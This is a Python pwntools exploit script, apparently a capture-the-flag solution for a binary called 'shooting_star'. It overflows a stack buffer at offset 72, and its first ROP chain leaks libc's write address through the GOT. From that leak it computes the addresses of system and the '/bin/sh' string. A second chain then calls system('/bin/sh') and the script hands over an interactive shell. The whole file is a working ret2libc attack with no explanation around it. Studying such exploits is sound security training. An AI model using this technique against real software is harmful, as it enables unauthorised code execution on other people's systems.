from pwn import *
import exploit_helper

# Specify GDB script here (breakpoints etc.)
gdb_script = '''
piebase
'''.format(**locals())

# Binary filename
exe = './shooting_star'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

ip_offset = 72

# leak_payload = flat({
#     ip_offset: [
#         rop.rsi.address,
#         elf.got.write,
#         0x0,
#         elf.plt.write,
#         elf.symbols.star
#     ]
# })

io = exploit_helper.start(exe=exe, gdb_script=gdb_script)

libc_version = 'libc6_2.27-3ubuntu1.4_amd64' if args.REMOTE else 'libc6_2.33-6debian_amd64'

leak_rop = ROP(elf)
leak_rop.raw(leak_rop.generatePadding(0, ip_offset))
leak_rop.call(elf.plt.write, [0x1, elf.got.write])
leak_rop.call(elf.symbols.star, [])

io.sendlineafter(b'> ', b'1')
io.sendlineafter(b'>> ', leak_rop.chain())

io.recvuntil(b'May your wish come true!\n')

leaked_address = io.recv()
libc_write_address = unpack(leaked_address[:6].ljust(8, b'\00'))
success(f'Leaked libc write address: {hex(libc_write_address)}')

libc_base_address = libc_write_address - exploit_helper.get_symbol_offset(libc_version, 'write')
info(f'Libc base address: {hex(libc_base_address)}')

libc_system_address = libc_base_address + exploit_helper.get_symbol_offset(libc_version, 'system')
info(f'Libc system address: {hex(libc_system_address)}')

libc_sh_string_offset = libc_base_address + exploit_helper.get_symbol_offset(libc_version, 'str_bin_sh')
info(f'Libc \'\\bin\\sh\' address: {hex(libc_sh_string_offset)}')

shell_rop = ROP(elf)
shell_rop.raw(shell_rop.generatePadding(0, ip_offset))
shell_rop.call(libc_system_address, [libc_sh_string_offset])

io.sendline(b'1')
io.sendlineafter(b'>> ', shell_rop.chain())

io.interactive()
